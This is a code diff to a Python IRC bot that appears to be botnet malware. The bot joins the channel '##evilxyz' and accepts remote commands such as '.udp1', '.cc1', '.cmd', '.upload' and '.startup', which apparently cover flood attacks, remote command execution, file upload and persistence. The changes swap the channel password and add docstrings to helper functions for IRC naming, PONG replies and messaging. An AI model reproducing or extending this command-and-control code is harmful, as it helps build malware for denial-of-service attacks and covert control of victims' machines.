@@ -24,7 +24,7 @@ PORT = 6667
 # channels to join on startup
 CHANNELS = ['##evilxyz', ]
 # channels password
-PASSWORD = "PASS"
+PASSWORD = "justforfun"
 # allowed instructions
 ALLOWED_INSTRUCTIONS = ['.udp1', '.udp2', '.cc1', '.cc2', '.cmd', '.geo', '.info', '.upload', '.reload', '.startup']
 
@@ -37,15 +37,21 @@ ALLOWED_INSTRUCTIONS = ['.udp1', '.udp2', '.cc1', '.cc2', '.cmd', '.geo', '.info
 
 
 def line_split(line, num=400):
+    """
+        if string more than 400, split and store to list
+    """
     split_out = []
-    # i am string more than 400
+
     while line:
         split_out.append(line[:num])
         line = line[num:]
     return split_out
 
 
-def check_url(url):  # url 格式检查
+def check_url(url):
+    """
+        check the url format
+    """
     url_regex = re.compile(r'^(?:http|https)?://'
                            r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'
                            r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
@@ -54,21 +60,21 @@ def check_url(url):  # url 格式检查
 
     if url_regex.findall(url):
         return True
-
     return False
 
 
 def signal_handler(signum, frame):
+    """
+        process signal
+    """
     print('Signal handler called with signal', signum)
 
 
 def name_bot(irc):
     """
-    Try to name the bot in order to be recognised on IRC
-
-    irc - an opened socket
-
-    Return the name of the bot
+        Try to name the bot in order to be recognised on IRC
+        irc - an opened socket
+        Return the name of the bot
     """
     nick = sys.platform[:3] + '-' + str(int(time.time()))  # platform + timestamp
     real_name = nick[3:]
@@ -431,12 +437,18 @@ def check_instruction(instruction):
 
 
 def pong(irc, destination):
+    """
+        when the server send  ping instruction, must reply pong instruction
+    """
     crlf = "\r\n"
     if len(destination):
         irc.send(("PONG :" + destination + crlf).encode('utf-8'))
 
 
 def privmsg(irc, to, message):
+    """
+        send instruction
+    """
     try:
         if to == CHANNELS or to == ADMIN:
             for line in message.strip().split('\n'):  # 逐行发送
